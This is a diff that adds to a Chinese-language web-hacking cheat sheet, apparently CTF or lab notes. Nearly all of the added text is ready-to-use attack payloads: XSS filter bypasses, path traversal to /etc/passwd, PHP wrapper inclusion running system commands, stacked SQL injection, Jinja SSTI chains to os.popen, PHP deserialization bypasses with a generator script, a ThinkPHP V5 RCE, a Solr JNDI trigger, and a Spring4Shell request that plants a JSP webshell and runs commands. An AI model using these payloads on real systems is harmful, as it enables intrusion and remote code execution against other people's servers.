@@ -81,11 +81,35 @@ powershell -ExecutionPolicy Bypass -File admin_login.ps1
 `~!@#$%^&*()-_+=[]{}\|;:'",<.>/?
 ```
 
+奇妙的XSS姿势
+
+```HTML
+<script>onerror=alert;throw 1337</script>
+
+<script>{onerror=alert}throw 1337</script>
+
+<script>throw onerror=alert,'some string',123,'haha'</script>
+
+<script>{onerror=eval}throw'=alert\x281337\x29'</script>
+
+<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script>
+
+<script>{onerror=prompt}throw{lineNumber:1,columnNumber:1,fileName:'second argument',message:'first argument'}</script>
+
+<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>
+
+<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
+```
+
 ## 目录穿越
 
 即配置错误导致可以访问的文件超出预期 如 `../` 等
 识别和利用，如
 `http://10.11.0.22/menu.php?file=c:\windows\system32\drivers\etc\hosts`
+绕过姿势
+```
+?file=test.php?/../../../../etc/passwd
+```
 
 ## 文件包含
 
@@ -139,6 +163,12 @@ http://192.168.1.53/antibot_image/antibots/info.php?image=/home/tomato/.ssh/id_r
 http://192.168.1.53/antibot_image/antibots/info.php?image=/root/.ssh/id_rsa
 ```
 
+尝试使用data协议
+```
+p=data://text/plain,<?php phpinfo()?>
+p=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
+```
+
 最后，可以考虑使用PHP包装器。
 如：直接使用有效负载
 ```
@@ -152,6 +182,12 @@ http://192.168.1.21/secret/evil.php?command=php://filter/convert.base64-encode/r
 尝试写入文件
 ```
 http://192.168.1.21/secret/evil.php?command=php://filter/write=convert.base64-decode/resource=test.txt&txt=MTIz
+```
+通过POST传参
+```
+POST /xxx?p=php://input HTTP/1.1
+
+<?php+system('ls')?>
 ```
 
 PHP读取本地文件 结合远程文件包含使用
@@ -180,6 +216,14 @@ http://192.168.1.26:7331/exp.php?file=/etc/passwd
 # http://10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables
 # http://10.11.0.22/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
 # http://10.11.0.22/debug.php?id=1 union all select 1, username, password from users
+
+# select被过滤时可以尝试
+-1';show databases;--+
+-1';use db_name;show tables;--+
+-1';use db_name;show columns from `table_name`;--+
+-1';Set @sql = CONCAT('sel','ect * from `table_name`;');PrePare stmt from @sql;execute stmt;--+
+-1';handler `table_name` open;handler `table_name` read first;handler `table_name` close;--+
+
 # 从SQL注入到代码执行
 # 根据OS、服务、文件系统权限 可能可以读写文件
 # 读文件
@@ -316,10 +360,51 @@ webdav上传：[[11 安全工具#davtest|davtest]]
 1. 寻找敏感文件，获取密码
 2. 拿取私钥 `id_rsa`
 
+## SSTI
+即服务端模板注入，Payload
+```
+{{1+33334443}}${1+33334443}<%1+33334443%>[33334443]
+
+# Python
+{{ 3+3 }}
+# 读配置
+{{config}}
+{{__globals__['current_app'].config['FLAG']}}
+{{url_for.__globals__}}
+{{get_flashed_messages.__globals__}}
+
+# 查看字典
+{{self.__dict__}}
+# 执行系统命令
+{% import os %}{{ os.popen('which nc').read() }}
+# 有时不能引入模块 需要手动搜索所有模块找到os 下面两种都行
+{{[].__class__.__base__.__subclasses__()}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+# 直接找os 或者其它 如 warnings.catch_warnings
+# 查看存在哪些值 bytearray中存在着os模块
+{{[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()}}
+{{[].__class__.__base__.__subclasses__()[59].__init__.func_globals.values()[13]}}
+{{[].__class__.__base__.__subclasses__()[59].__init__.func_globals.values()[13]['eval']("__import__('os').popen('ls').read()")}}
+{{[].__class__.__base__.__subclasses__()[59].__init__.func_globals.values()[13]['eval']("__import__('os').popen('cat fl4g').read()")}}
+# file可以直接读取文件
+{{[].__class__.__base__.__subclasses__()[40]("fl4g").read()}}
+```
+## 代码审计
+
+### PHP
+1. 有检查并不一定安全，需要比较最终输入和检查过程。
+2. assert()会执行代码
+3. preg_replace()的第二个参数会执行代码：system('ls -la')
+
 ## 不安全的反序列化
 PHP反序列化，O表示对象，s表示字符串，a表示数组，b表示布尔值，后面的数字是长度
+私有变量前后有%00
+增加+号或改变长度可以绕过部分限制
 ```
 O:8:"pingTest":1:{s:9:"ipAddress";s:9:"127.0.0.1";}
+O:4:"Demo":1:{s:10:"%00Demo%00file";s:8:"fl4g.php";}
+O:+4:"Demo":1:{s:10:"%00Demo%00file";s:8:"fl4g.php";}
+O:+4:"Demo":2:{s:10:"%00Demo%00file";s:8:"fl4g.php";}
 ```
 生成负载示例，自己手动实现一个相同的类，加上需要的字段
 ```php
@@ -356,6 +441,19 @@ echo "\n";
 echo base64_encode($sd_obj);
 ?>
 ```
+
+```PHP
+<?php
+class Demo {
+    private $file = 'fl4g.php';
+}
+$a=serialize(new Demo);
+$a=str_replace('4:', '+4:', $a);
+$a=str_replace('1:', '2:', $a);
+$a=base64_encode($a);
+echo $a;
+?>
+```
 反序列化技术的核心：将字符流（通信对象）转化为程序对象
 字符流完全由客户端控制，将其修改为恶意对象，存在极大的安全隐患
 如Java中的RMI，数据在其客户端和服务端之间都是以字节流的形式传递的，最终一定会反序列化（JRMP是规范RMI过程中数据传输的协议）
@@ -382,6 +480,22 @@ curl -v --data "echo;id" 'http://your-ip:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65
 可以通过上传一个 `shell.shtml` 文件执行命令
 ```
 <!--#exec cmd="ls" -->
+```
+
+### ThinkPHP
+
+#### V5 RCE
+
+PoC，直接访问
+```
+/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
+```
+
+利用
+```
+/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+
+/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/flag
 ```
 
 ### WebLogic
@@ -15944,4 +16058,22 @@ java -jar /home/kali/Tools/Jars/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "
 触发
 ```
 GET /solr/admin/cores?action=${jndi:ldap://192.168.40.129:1389/zsee0t} HTTP/1.1
+```
+
+### Spring
+
+#### Spring4Shell (CVE-2022-22965)
+PoC，类型不对会报错
+```
+class.module.classLoader.DefaultAssertionStatus=False
+class.module.classLoader.DefaultAssertionStatus=12345
+```
+exp
+```
+class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di+if%28%22j%22.equals%28request.getParameter%28%22pwd%22%29%29%29%7B+java.io.InputStream+in+%3D+%25%7Bc1%7Di.getRuntime%28%29.exec%28request.getParameter%28%22cmd%22%29%29.getInputStream%28%29%3B+int+a+%3D+-1%3B+byte%5B%5D+b+%3D+new+byte%5B2048%5D%3B+while%28%28a%3Din.read%28b%29%29%21%3D-1%29%7B+out.println%28new+String%28b%29%29%3B+%7D+%7D+%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps%2FROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
+```
+执行
+```
+/tomcatwar.jsp?pwd=j&cmd=whoami
+/tomcatwar.jsp?pwd=j&cmd=ls+-la
 ```
